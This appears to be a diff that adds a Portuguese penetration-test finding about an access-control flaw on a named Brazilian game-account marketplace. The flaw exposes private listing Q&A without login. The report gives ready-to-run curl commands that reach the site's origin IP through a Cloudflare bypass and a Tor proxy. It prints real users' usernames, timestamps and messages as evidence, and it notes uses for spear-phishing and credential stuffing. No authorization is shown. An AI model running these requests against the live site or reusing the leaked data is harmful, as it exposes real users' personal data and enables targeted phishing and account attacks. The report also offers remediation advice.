@@ -1,0 +1,100 @@
+# F-013 — IDOR /anuncio/perguntas.html vaza Q&A completo (PII) sem auth [ALTO]
+
+**Host:** `desapegogames.com.br/anuncio/perguntas.html` (via bypass CF `186.226.60.54`)
+**Severidade:** ALTO
+**Status:** CONFIRMADO
+**Data:** 2026-09-05T00:09Z (UTC) — amostra enriquecida
+**OWASP:** A01:2021 — Broken Access Control (IDOR/BOLA)
+**CVSS 3.1:** AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N = 5.3 (MEDIUM) — escala (351k IDs) e PII elevam impacto.
+
+## Descrição
+
+`POST /anuncio/perguntas.html` com parâmetro `anuncio=<ID>` retorna o
+Q&A completo do anúncio (perguntas + respostas) **sem qualquer
+autenticação**, para qualquer ID sequencial no range ~1..351451. O
+endpoint vaza:
+
+- **Username** e **display name** do questionador e do vendedor
+  (link `/perfil/<username>`).
+- **Texto** das perguntas e respostas (negociação, condições, preço).
+- **Timestamps** precisos (formato `DD/MM/YYYY HH:MM`).
+- **Avatar** do vendedor (`/assets/site/imagens/usuarios/<md5>.png`).
+
+O `GET` sem parâmetro retorna "Você não tem autorização", mas o `POST`
+com `anuncio=<ID>` renderiza o conteúdo — inconsistência de autorização
+(possível bypass de controle de acesso). IDs inexistentes/sem Q&A
+retornam 73 bytes ("Você não tem autorização para visualizar as
+perguntas desse anúncio.").
+
+## Reprodução
+
+```bash
+# Q&A de anúncio existente com perguntas (sem auth)
+curl -k -H "Host: desapegogames.com.br" --proxy socks5://127.0.0.1:9050 \
+  -X POST https://186.226.60.54/anuncio/perguntas.html -d "anuncio=309843"
+# HTTP 200, 5311 bytes — Q&A completo com usernames, timestamps, msgs
+
+# Anúncio sem Q&A / inexistente
+curl -k -H "Host: desapegogames.com.br" --proxy socks5://127.0.0.1:9050 \
+  -X POST https://186.226.60.54/anuncio/perguntas.html -d "anuncio=1"
+# HTTP 200, 73 bytes — "Você não tem autorização para visualizar as perguntas desse anúncio."
+```
+
+## Amostra de evidência (PII vazada) — read-only, não-destrutivo
+
+### anuncio=309843 (SIZE 5311)
+- **Usernames vazados:** `akaiig`, `bigaz`, `contaslol`, `fogss`
+- **Timestamps:** `01/09/2026 20:27`, `02/09/2026 07:52`, `19/08/2026 18:25`,
+  `19/08/2026 19:56`, `11/08/2026 14:44`, `11/08/2026 15:08`
+- **Mensagens (negociação):**
+  - "opa mano, por acaso teria uma conta com skin deus rei darius"
+  - "Não sei, vai na sorte as contas"
+  - "porque diz que é 15.99 quando clica vai pra 30?"
+  - "Acho que você está vendo errado, está R$ 30,99 no topo do anúncio."
+
+### anuncio=169676 (SIZE 2813)
+- **Usernames vazados:** `joseluis`, `miacontas`
+- **Timestamps:** `10/01/2024 11:24`, `09/01/2024 21:54`, `10/01/2024 09:54`
+- **Mensagens:**
+  - "Vou comprar assim que eu sair do trabalho 17 hrs"
+  - "Você compra normalmente e recebe a sensibilidade automaticamente no chat, após isso é só confirmar que recebeu."
+
+### Outros IDs testados (amostra de escala)
+| anuncio | size | Q&A? |
+|---------|------|------|
+| 1, 2, 100, 500, 1000 | 73 | não (sem Q&A ou inexistente) |
+| 99999, 351180, 351451 | 300 | sim (Q&A presente) |
+| 169676 | 2813 | sim (Q&A presente) |
+| 309843 | 5311 | sim (Q&A presente) |
+
+Arquivos crus em `enum/idor_evidence/id_*.html`.
+
+## Impacto
+
+- **Broken Access Control (OWASP A01:2021).** Qualquer anônimo lê o Q&A
+  privado de qualquer anúncio enumerando IDs sequenciais (1..~351451).
+- Vaza **PII**: usernames (→ `/perfil/<user>` enumeração, F-005),
+  timestamps de atividade, conteúdo de negociações (preço, condições,
+  intenção de compra), avatares.
+- Escala massiva: ~351k anúncios × Q&A = base de dados de interações
+  privadas entre compradores/vendedores exposta.
+- Combina com F-005 (5.544 usernames via `/perfil/`) e F-019 (enum por
+  email): triângulo completo de OSINT/PII.
+- Útil para: perfilamento de usuários ativos, spear-phishing
+  contextualizado (sabe-se o que cada um comprou/vendeu/quis), ataque a
+  contas via credential stuffing (F-014, login sem captcha).
+
+## Recomendação
+
+- Exigir autenticação no endpoint `/anuncio/perguntas.html`.
+- Validar permissão/visibilidade do anúncio para o usuário logado
+  (checar sessão, não apenas ID do anúncio).
+- Não retornar Q&A por ID sem checagem de propriedade ou contexto
+  público explicitamente declarado.
+- Migrar para padrão de autorização baseada em objeto (BOLA):
+  `POST /anuncio/<id>/perguntas` com middleware de auth que valida o
+  usuário autenticado.
+
+## Referências
+- OWASP A01:2021 — Broken Access Control
+- CWE-639 — Authorization Bypass Through User-Controlled Key (IDOR)
